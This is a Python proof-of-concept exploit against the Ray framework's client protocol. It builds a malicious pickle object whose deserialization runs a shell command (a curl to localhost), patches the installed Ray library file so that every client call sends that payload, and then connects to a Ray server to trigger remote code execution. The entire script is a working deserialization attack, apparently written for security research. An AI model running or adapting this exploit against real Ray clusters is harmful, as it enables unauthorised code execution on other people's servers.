import re

from pathlib import Path

from ray.util.client.client_pickler import dumps_from_client


class PickleRce(object):
  def __reduce__(self):
    import os
    return os.system, ("curl http://localhost:4321",)

malicous_payload = str(dumps_from_client(PickleRce(), '98b1168c79934dcfa6312de646213572'))
malicous_payload = f"{malicous_payload!r}".strip('"')


####################################################################
# Step 2 - Modify the client method
client_pickler = Path(".venv/lib/python3.10/site-packages/ray/util/client/client_pickler.py")
module_content = client_pickler.read_text()
method_pattern = re.compile(r'def dumps_from_client.*?\n\n', re.DOTALL)

patched_method = f"def dumps_from_client(obj: Any, client_id: str, protocol=None) -> bytes:\n\tprint('DUMPS FROM CLIENT CALLED!!!')\n\treturn {malicous_payload}\n\n"
patched_module = re.sub(method_pattern, patched_method, module_content)

client_pickler.write_text(patched_module)


####################################################################
# Step 4 - Test server
import ray
from ray.data import from_items

# Connect to the Ray cluster
ray.init("ray://127.0.0.1:5000")

# Create a Ray Dataset
dataset = from_items([{"value": i} for i in range(1000)])

# Perform a simple operation: filter
filtered_dataset = dataset.filter(lambda record: record["value"] % 2 == 0)

# Collect the results to a list
results = filtered_dataset.take(limit=10)

print(results)
